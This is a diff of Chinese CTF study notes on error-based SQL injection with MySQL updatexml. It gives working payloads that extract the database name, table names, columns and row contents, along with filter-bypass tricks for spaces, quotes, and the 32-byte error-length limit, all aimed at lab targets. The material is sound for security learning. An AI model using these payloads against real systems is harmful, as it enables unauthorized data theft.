@@ -28,9 +28,9 @@ categories: [100 Cyber security, 120 CTF, 121 Web ]
 ### 手注变种：报错注入
 https://www.cnblogs.com/c1047509362/p/12806297.html
 1. `1'or(updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1))='1` 爆出数据库
-1. `1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))，0x7e),1))='1` 爆当前数据库表信息
-1. `1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=wp_links)and(table_name='users')),0x7e),1))='1` 爆user表字段信息
-1. `1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #` 爆数据库内容
+1. `1'or(updatexml(1,concat(0x7c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7c),1))='1` 爆当前数据库表信息
+1. `1'or(updatexml(1,concat(0x7c,(select(group_concat(column_name))from(information_schema.columns)where(table_schema='test')and(table_name='user')),0x7c),1))='1` 爆user表字段信息
+1. `1'or(updatexml(1,concat(0x7e,(select group_concat(flag) from lession2.flag)),1))='1` 爆数据库内容
 ref：https://www.codenong.com/cs106450896/
 
 #### 报错注入变种：无单引号版
@@ -44,7 +44,7 @@ ref：https://blog.csdn.net/forwardss/article/details/104682924
 1. 替代空格：
     * 使用括号，eg：`3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1`
     * 使用内联注释：`/**/`
-1. 报错注入，返回值XPATH syntax error有长度限制，为32bytes。使用substr截取需要的部分回显`updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,32),0x7e),1)`
+1. 报错注入，返回值XPATH syntax error有长度限制，为32bytes。使用substr截取需要的部分回显`updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,32),0x7e),1)`,`1'or(updatexml(1,concat(0x7c,substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema='test')and(table_name='user')),1,32),0x7c),1))='1`,`1'or(updatexml(1,concat(0x7e,substr((select group_concat(flag) from lession2.flag),31,61),0x7c),1))='1`
 1. substr不能用：利用not in。`(select%201%20and%201=updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where table_schema=database() and table_name not in(0x6e657773)),0x7e),1))&target=1`，注意not in里面必须有内容，然后一点点添加不需要的表名，筛选出需要的表名。
 1. 单引号被转义为\：用0x5C替代单引号
 ref：https://www.cnblogs.com/lwfiwo/p/11314408.html
